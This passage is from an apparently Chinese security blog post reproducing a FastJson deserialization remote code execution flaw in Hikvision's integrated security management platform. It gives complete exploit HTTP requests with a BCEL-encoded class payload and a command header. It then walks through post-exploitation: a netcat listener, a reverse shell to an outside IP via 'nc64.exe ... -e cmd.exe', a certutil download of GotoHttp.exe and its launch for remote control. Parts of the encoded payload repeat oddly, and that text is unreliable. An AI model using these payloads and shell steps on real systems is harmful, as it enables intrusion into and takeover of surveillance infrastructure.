u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"}}</code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-472" src="/wp-content/uploads/2024/07/640-76.png" width="942" height="379" alt="640-76" title="640-76"></figure>
+
+
+
+<p><strong>EXP3</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+</ul>
+
+
+
+<pre class="wp-block-preformatted"><code>POST /bic/ssoService/v1/applyAutoLoginTicket HTTP/1.1</code><code>Host: your-ip</code><code>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</code><code>Content-Type: application/json</code><code>cmd: whoami</code><code> </code><code>{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$$$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"}}}</code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-473" src="/wp-content/uploads/2024/07/640-77.png" width="956" height="359" alt="640-77" title="640-77"></figure>
+
+
+
+<p><strong></strong>Ⅳ、远控手段利用<strong></strong></p>
+
+
+
+<p><strong>准备环境:一台服务器</strong></p>
+
+
+
+<p><strong>1、开启NC监听</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code>nc64.exe -lvnp 7788</code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-474" src="/wp-content/uploads/2024/07/640-78.png" width="867" height="148" alt="640-78" title="640-78"></figure>
+
+
+
+<p><strong>2、重放数据包</strong><strong></strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code>nc64.exe 38.12.31.36 7788 -e cmd.exe</code></pre>
+
+
+
+<p>完整代码</p>
+
+
+
+<ul class="wp-block-list">
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+
+
+
+<li>
+</ul>
+
+
+
+<pre class="wp-block-preformatted"><code>POST /bic/ssoService/v1/applyCT HTTP/1.1</code><code>Host: </code><code>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</code><code>Accept-Encoding: gzip, deflate</code><code>Accept: */*</code><code>Connection: close</code><code>Content-Type: application/json</code><code>cmd: nc64.exe 38.12.31.36 7788 -e cmd.exe</code><code>Content-Length: 3331</code><code><br></code><code>{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"}}}</code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-475" src="/wp-content/uploads/2024/07/640-79.png" width="1080" height="601" alt="640-79" title="640-79"></figure>
+
+
+
+<p>直接拿shell</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-476" src="/wp-content/uploads/2024/07/640-80.png" width="1062" height="692" alt="640-80" title="640-80"></figure>
+
+
+
+<p><strong>3、服务器开启http服务</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code>python -m http.server 9999</code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-477" src="/wp-content/uploads/2024/07/640-81.png" width="1080" height="525" alt="640-81" title="640-81"></figure>
+
+
+
+<p>4<strong>、下载GotoHttp.exe</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code>certutil.exe -urlcache -split -f http:<em>//IP/GotoHttp.exe</em></code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-478" src="/wp-content/uploads/2024/07/640-82.png" width="1080" height="604" alt="640-82" title="640-82"></figure>
+
+
+
+<p>5<strong>、启动GotoHttp</strong><strong></strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code>start GotoHttp.exe</code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-479" src="/wp-content/uploads/2024/07/640-83.png" width="1080" height="641" alt="640-83" title="640-83"></figure>
+
+
+
+<p>启动后，对应的ini配置文件会在当前目录下生成</p>
+
+
+
+<p>6<strong>、查看INI与远程连接</strong></p>
+
+
+
+<ul class="wp-block-list">
+<li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code>type gotohttp.ini</code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-480" src="/wp-content/uploads/2024/07/640-84.png" width="1051" height="158" alt="640-84" title="640-84"></figure>
+
+
+
+<ul class="wp-block-list">
+<li>
+</ul>
+
+
+
+<pre class="wp-block-code"><code> https:<em>//cd.gotohttp.com</em></code></pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-481" src="/wp-content/uploads/2024/07/640-85.png" width="1080" height="614" alt="640-85" title="640-85"></figure>
+    </div>
+
+    <!-- 底部元信息 -->
+    <div class="post-footmeta mb-4">
+        <div class="row d-flex align-items-center">
+            <div class="col-md-6 col-12">
+                <div class="post-share justify-content-sm-start mb-3 mb-sm-0">
+                    <div class="post-btnmeta">
+                        <span class="post-like trans_2ms" :class="postMeta.postLike_on ? 'on' : ''" @click="_setlike"><i class="cxicon cxicon-zan-black"></i> <em style="font-style: normal" x-text="postMeta.postLike" x-show="postMeta.postLike !== 0"></em></span>
+                    </div>
+                    <i class="cxline-1"></i>
+                    <ul class="social-icons" x-data="{'postThumb':'/wp-content/uploads/2024/07/640-74.png','postLink' : window.location.href, 'postTitle' : document.title}">
+                        <li class="list-inline-item">
+                            <a href="javascript:;" title="分享到微信" x-bind="weixinLink"><i class="cxicon cxicon-weixin"></i></a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a href="javascript:;" title="分享到微博" x-bind="weiboLink"><i class="cxicon cxicon-weibo"></i></a>
+                        </li>
+                        <li class="list-inline-item">
+                            <a href="javascript:;" title="分享到QQ" x-bind="qqLink"><i class="cxicon cxicon-qq"></i></a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+            <div class="col-md-6 col-12 text-center text-md-end">
+                <div class="tags">
+                                    </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="about-author p-4 mt-5 flex-sm-row">
+        <div class="thumb"><a class="author" href="/archives/author/guozhiman"><figure class="figure-avatar  btn-default userid-1"><img alt="" src="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=100&#038;d=mm&#038;r=g" srcset="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=200&#038;d=mm&#038;r=g 2x" class="avatar avatar-100 photo" height="100" width="100" loading="lazy" decoding="async"></figure></a></div>        <div class="details ps-sm-4 mt-3 mt-sm-0 text-sm-start">
+            <h4 class="name"><a href="/archives/author/guozhiman" title="文章作者 guozhiman" rel="author">guozhiman</a></h4>
+            <p>暂无介绍....</p>
+            <ul class="social-icons list-unstyled list-inline mb-0">
+                <!-- 社交信息 -->
+                <li class="list-inline-item">
+                    <a href="#"><i class="cxicon cxicon-weixin"></i></a>
+                </li>
+                <li class="list-inline-item">
+                    <a href="#" target="_blank"><i class="cxicon cxicon-weibo"></i></a>
+                </li>
+                <li class="list-inline-item">
+                    <a href="#" target="_blank"><i class="cxicon cxicon-qq"></i></a>
+                </li>
+                <li class="list-inline-item">
+                    <i class="cxline-1 ms-0 me-2"></i>
+                    <a href="/archives/author/guozhiman" class="author-link">TA的主页 <i class="cxicon cxicon-jtright font-inherit"></i></a>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="row nextprev-post-wrapper mb-4">
+        <div class="col-md-6 col-12 mb-3 mb-sm-0">
+            <div class="nextprev-post prev">
+                <span class="nextprev-text"> 上一篇</span>
+                <h5 class="post-title">
+                    <a href="/archives/390" rel="prev">OpenMetadata 命令执行漏洞复现(CVE-2024-28255)|自带工具和拿shell</a>                </h5>
+            </div>
+        </div>
+        <div class="col-md-6 col-12">
+            <div class="nextprev-post next text-sm-end">
+                <span class="nextprev-text">下一篇</span>
+                <h5 class="post-title">
+                    <a href="/archives/399" rel="next">通天星CMSV6 车载视频监控平台 信息泄露漏洞复现</a>                </h5>
+            </div>
+        </div>
+    </div>
+
+    <section class="comments">
+        <!-- 评论区代码 -->
+    </section>
+
+    <div class="mso nobg">
+        <div class="module-tit item-center noborder">
+            <h3 style="font-size:1rem">
+<i class="cxline"></i>延伸阅读:</h3>
+            <p></p>
+        </div>
+        <div class="module-content">
+        <div class="item-jx item-blog small">
+    <div class="jxbox">
+        <div class="thumb">
+            <a href="/archives/399">
+                <div class="thumb-inner">
+                    <img loading="lazy" decoding="async" src="/wp-content/uploads/2024/07/640-69.png" width="280" height="180" alt="通天星CMSV6 车载视频监控平台 信息泄露漏洞复现">
+                </div>
+            </a> 
+            <div class="sortbox">
+                
+                        <a href="/archives/category/wangluoanquan" class="sort sort-7">网络安全</a>
+                                    </div>                                           
+        </div>
+        <div class="subtitle">
+            
+            <!-- <p><span class="author">小牛爱奋斗</span>｜<span class="time">2023.10.21</span></p> -->
+            <h5><a href="/archives/399">通天星CMSV6 车载视频监控平台 信息泄露漏洞复现</a></h5>
+            <p class="pdesc">一、 产品简介 通天星CMSV6车载视频监控平台是东莞市通天星软件科技有限公司Q研发的监控平台，通天星CMSV6产品覆盖...</p>
+            <div class="pmbox">
+                <div class="l">
+                    <a class="author" href="/archives/author/guozhiman"><figure class="figure-avatar  btn-default userid-1"><img alt="" src="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=30&#038;d=mm&#038;r=g" srcset="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=60&#038;d=mm&#038;r=g 2x" class="avatar avatar-30 photo" height="30" width="30" loading="lazy" decoding="async"></figure>guozhiman</a> <i class="cxicon cxicon-dian color-grad"></i> <span class="time">2024年7月22日</span>                </div>
+                <div class="r">
+                    <a href="/archives/399" class="more-link"><i class="cxicon cxicon-caidan-h"></i></a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="item-jx item-blog small">
+    <div class="jxbox">
+        <div class="thumb">
+            <a href="/archives/392">
+                <div class="thumb-inner">
+                    <img loading="lazy" decoding="async" src="/wp-content/uploads/2024/07/640-74.png" width="280" height="180" alt="海康威视综合安防管理平台 多处 FastJson反序列化RCE漏洞复现">
+                </div>
+            </a> 
+            <div class="sortbox">
+                
+                        <a href="/archives/category/wangluoanquan" class="sort sort-7">网络安全</a>
+                                    </div>                                           
+        </div>
+        <div class="subtitle">
+            
+            <!-- <p><span class="author">小牛爱奋斗</span>｜<span class="time">2023.10.21</span></p> -->
+            <h5><a href="/archives/392">海康威视综合安防管理平台 多处 FastJson反序列化RCE漏洞复现</a></h5>
+            <p class="pdesc">Ⅰ、漏洞描述海康威视综合安防管理平台是一套“集成化”、“智能化”的平台,通过接入 视频监控Q一卡通、停车场、报警检测等系...</p>
+            <div class="pmbox">
+                <div class="l">
+                    <a class="author" href="/archives/author/guozhiman"><figure class="figure-avatar  btn-default userid-1"><img alt="" src="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=30&#038;d=mm&#038;r=g" srcset="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=60&#038;d=mm&#038;r=g 2x" class="avatar avatar-30 photo" height="30" width="30" loading="lazy" decoding="async"></figure>guozhiman</a> <i class="cxicon cxicon-dian color-grad"></i> <span class="time">2024年7月22日</span>                </div>
+                <div class="r">
+                    <a href="/archives/392" class="more-link"><i class="cxicon cxicon-caidan-h"></i></a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="item-jx item-blog small">
+    <div class="jxbox">
+        <div class="thumb">
+            <a href="/archives/390">
+                <div class="thumb-inner">
+                    <img loading="lazy" decoding="async" src="/wp-content/uploads/2024/07/640-86.png" width="280" height="180" alt="OpenMetadata 命令执行漏洞复现(CVE-2024-28255)|自带工具和拿shell">
+                </div>
+            </a> 
+            <div class="sortbox">
+                
+                        <a href="/archives/category/wangluoanquan" class="sort sort-7">网络安全</a>
+                                    </div>                                           
+        </div>
+        <div class="subtitle">
+            
+            <!-- <p><span class="author">小牛爱奋斗</span>｜<span class="time">2023.10.21</span></p> -->
+            <h5><a href="/archives/390">OpenMetadata 命令执行漏洞复现(CVE-2024-28255)|自带工具和拿shell</a></h5>
+            <p class="pdesc">Ⅰ、产品简介 OpenMetadata是一个统一的发现、可观察和治理平台，由中央 元数据存储Q 库、深入的沿袭和无缝团队...</p>
+            <div class="pmbox">
+                <div class="l">
+                    <a class="author" href="/archives/author/guozhiman"><figure class="figure-avatar  btn-default userid-1"><img alt="" src="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=30&#038;d=mm&#038;r=g" srcset="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=60&#038;d=mm&#038;r=g 2x" class="avatar avatar-30 photo" height="30" width="30" loading="lazy" decoding="async"></figure>guozhiman</a> <i class="cxicon cxicon-dian color-grad"></i> <span class="time">2024年7月22日</span>                </div>
+                <div class="r">
+                    <a href="/archives/390" class="more-link"><i class="cxicon cxicon-caidan-h"></i></a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="item-jx item-blog small">
+    <div class="jxbox">
+        <div class="thumb">
+            <a href="/archives/388">
+                <div class="thumb-inner">
+                    <img loading="lazy" decoding="async" src="/wp-content/uploads/2024/07/640-99.png" width="280" height="180" alt="天融信-上网行为管理系统static_convert接口远程命令执行漏洞复现+拿shell [附POC]">
+                </div>
+            </a> 
+            <div class="sortbox">
+                
+                        <a href="/archives/category/wangluoanquan" class="sort sort-7">网络安全</a>
+                                    </div>                                           
+        </div>
+        <div class="subtitle">
+            
+            <!-- <p><span class="author">小牛爱奋斗</span>｜<span class="time">2023.10.21</span></p> -->
+            <h5><a href="/archives/388">天融信-上网行为管理系统static_convert接口远程命令执行漏洞复现+拿shell [附POC]</a></h5>
+            <p class="pdesc">Ⅰ、前言 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接...</p>
+            <div class="pmbox">
+                <div class="l">
+                    <a class="author" href="/archives/author/guozhiman"><figure class="figure-avatar  btn-default userid-1"><img alt="" src="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=30&#038;d=mm&#038;r=g" srcset="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=60&#038;d=mm&#038;r=g 2x" class="avatar avatar-30 photo" height="30" width="30" loading="lazy" decoding="async"></figure>guozhiman</a> <i class="cxicon cxicon-dian color-grad"></i> <span class="time">2024年7月22日</span>                </div>
+                <div class="r">
+                    <a href="/archives/388" class="more-link"><i class="cxicon cxicon-caidan-h"></i></a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+<div class="item-jx item-blog small">
+    <div class="jxbox">
+        <div class="thumb">
+            <a href="/archives/386">
+                <div class="thumb-inner">
+                    <img loading="lazy" decoding="async" src="/wp-content/uploads/2024/07/640-108.png" width="280" height="180" alt="NACOS最新漏洞|MSTSC远控+投毒+批量扫描+MSF+CS远控上线">
+                </div>
+            </a> 
+            <div class="sortbox">
+                
+                        <a href="/archives/category/wangluoanquan" class="sort sort-7">网络安全</a>
+                                    </div>                                           
+        </div>
+        <div class="subtitle">
+            
+            <!-- <p><span class="author">小牛爱奋斗</span>｜<span class="time">2023.10.21</span></p> -->
+            <h5><a href="/archives/386">NACOS最新漏洞|MSTSC远控+投毒+批量扫描+MSF+CS远控上线</a></h5>
+            <p class="pdesc">Ⅰ、产品简介 NACOS是 Alibaba 开源的一款用于微服务架构的注册中心和配置中心。它为开发人员提供了轻量级的服务...</p>
+            <div class="pmbox">
+                <div class="l">
+                    <a class="author" href="/archives/author/guozhiman"><figure class="figure-avatar  btn-default userid-1"><img alt="" src="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=30&#038;d=mm&#038;r=g" srcset="http://cn.cravatar.com/avatar/740a87cfff4579440e19183a73f02b68?s=60&#038;d=mm&#038;r=g 2x" class="avatar avatar-30 photo" height="30" width="30" loading="lazy" decoding="async"></figure>guozhiman</a> <i class="cxicon cxicon-dian color-grad"></i> <span class="time">2024年7月22日</span>                </div>
+                <div class="r">
+                    <a href="/archives/386" class="more-link"><i class="cxicon cxicon-caidan-h"></i></a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>        </div>
+    </div>
+</article>                    </div>
+                </div>
+            </div>
+            
+            <div class="col-right" id="sidebar">
+    <div class="rowright">
+        <aside class="side-area">
+            <div class="widget widget_block widget_search"><form role="search" method="get" action="/" class="wp-block-search__button-outside wp-block-search__text-button wp-block-search">
+<label class="wp-block-search__label" for="wp-block-search__input-1">搜索</label><div class="wp-block-search__inside-wrapper ">
